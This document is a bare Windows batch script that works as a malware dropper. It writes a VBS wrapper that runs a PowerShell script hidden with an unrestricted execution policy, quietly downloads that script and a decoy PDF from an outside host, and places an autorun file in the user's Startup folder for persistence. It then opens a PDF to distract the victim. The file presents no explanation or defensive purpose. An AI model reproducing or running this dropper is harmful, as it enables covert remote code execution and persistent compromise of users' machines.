cd "%USERPROFILE%\AppData\Local\Temp\"
echo command = "powershell.exe -nologo -ExecutionPolicy Unrestricted -File %temp%\script.ps1" >run.vbs
echo set shell = CreateObject("WScript.Shell") >>run.vbs
echo shell.Run command,0 >>run.vbs
powershell.exe -WindowStyle hidden wget https://site.com/script.ps1 -OutFile %TEMP%\script.ps1
powershell.exe -WindowStyle hidden wget https://site.com/document.pdf -OutFile %TEMP%\document.pdf
cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
echo wscript %USERPROFILE%\AppData\Local\Temp\run.vbs > autorun.bat
start /B autorun.bat
cd "%USERPROFILE%\AppData\Local\Temp\"
start /max Readme.pdf
